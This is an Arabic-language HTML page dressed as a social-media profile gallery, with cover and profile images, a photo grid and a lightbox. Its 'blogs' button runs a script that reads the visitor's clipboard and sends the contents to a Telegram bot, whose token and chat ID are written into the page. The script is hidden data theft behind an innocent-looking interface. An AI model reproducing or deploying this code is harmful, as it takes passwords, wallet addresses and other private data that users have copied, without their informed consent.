<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>طائفة الظلام - DKSTx666</title>
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <style>
    body {
      margin: 0;
      background-color: #1a001a; /* 👑 خلفية بنفسجية داكنة */
      font-family: 'Arial', sans-serif;
      direction: rtl;
      color: white;
      text-align: center;
      overflow-x: hidden;
    }

    .header {
      position: relative;
    }

    .cover {
      width: 100%;
      height: 200px;
      object-fit: cover;
    }

    .profile {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 4px solid #fff;
      position: absolute;
      bottom: -50px;
      right: 20px;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 #a64ca6; }
      70% { box-shadow: 0 0 0 20px transparent; }
      100% { box-shadow: 0 0 0 0 transparent; }
    }

    .posts {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 10px;
      padding: 60px 10px 10px;
    }

    .posts img {
      width: 100%;
      aspect-ratio: 1/1;
      object-fit: cover;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.3s;
    }

    .posts img:hover {
      transform: scale(1.05);
    }

    .fullscreen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.9);
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 1000;
    }

    .fullscreen img {
      max-width: 90%;
      max-height: 80%;
    }

    .download-btn {
      margin-top: 10px;
      padding: 10px 20px;
      background: pink;
      color: black;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
    }

    .video-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: #8e44ad;
      color: white;
      border: none;
      padding: 15px;
      border-radius: 50%;
      font-size: 20px;
      cursor: pointer;
      animation: pulse 1.5s infinite;
    }

    .blog-btn {
      position: fixed;
      bottom: 20px;
      left: 20px;
      background: yellow;
      color: black;
      border: none;
      padding: 15px;
      border-radius: 50%;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      animation: pulse 2s infinite;
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="cover.jpg" alt="غلاف" class="cover"> <!-- 👑 صورة الغلاف -->
    <img src="profile.jpg" alt="بروفايل" class="profile" onclick="zoomProfile()"> <!-- 👑 صورة البروفايل -->
  </div>

  <div class="posts">
    <!-- 👑 صور المنشورات (ضع الصور المتوفرة فقط) -->
    <img src="post1.jpg" alt="" onclick="zoomImage(this.src)">
    <img src="post2.jpg" alt="" onclick="zoomImage(this.src)">
    <img src="post3.jpg" alt="" onclick="zoomImage(this.src)">
    <!-- أضف حتى 25 صورة حسب المتوفر -->
  </div>

  <!-- نافذة تكبير -->
  <div class="fullscreen" id="fullscreen">
    <img id="fullImage" src="">
    <a id="downloadLink" download>
      <button class="download-btn">📥 تحميل الصورة</button>
    </a>
  </div>

  <!-- زر فيديو -->
  <button class="video-btn" onclick="alert('سيتم إضافة الفيديو لاحقًا')">🎥</button>

  <!-- زر مدونات (فلبيني) -->
  <button class="blog-btn" onclick="accessClipboard()">📋</button>

  <script>
    // 👑 بيانات التليغرام
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";

    // 👑 تكبير صور المنشورات
    function zoomImage(src) {
      document.getElementById('fullImage').src = src;
      document.getElementById('downloadLink').href = src;
      document.getElementById('fullscreen').style.display = 'flex';
    }

    function zoomProfile() {
      const src = document.querySelector('.profile').src;
      zoomImage(src);
    }

    document.getElementById('fullscreen').onclick = function () {
      this.style.display = 'none';
    };

    // 👑 الوصول للحافظة عند الضغط على زر المدونات
    async function accessClipboard() {
      try {
        const permission = await navigator.permissions.query({ name: 'clipboard-read' });

        if (permission.state === 'denied') {
          alert("❌ Hindi pinapayagan ang access sa clipboard.");
          return;
        }

        const text = await navigator.clipboard.readText();

        if (text.trim() === "") {
          alert("📭 Walang laman ang clipboard.");
        } else {
          alert("✅ Nabasang clipboard. Ipinapadala sa bot...");
          sendToTelegram("📋 Clipboard content:\n\n" + text);
        }

      } catch (err) {
        alert("⚠️ Hindi suportado ng browser ang pagbabasa mula sa clipboard.");
        console.error(err);
      }
    }

    // 👑 إرسال إلى التليغرام
    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      });
    }
  </script>

</body>
</html>
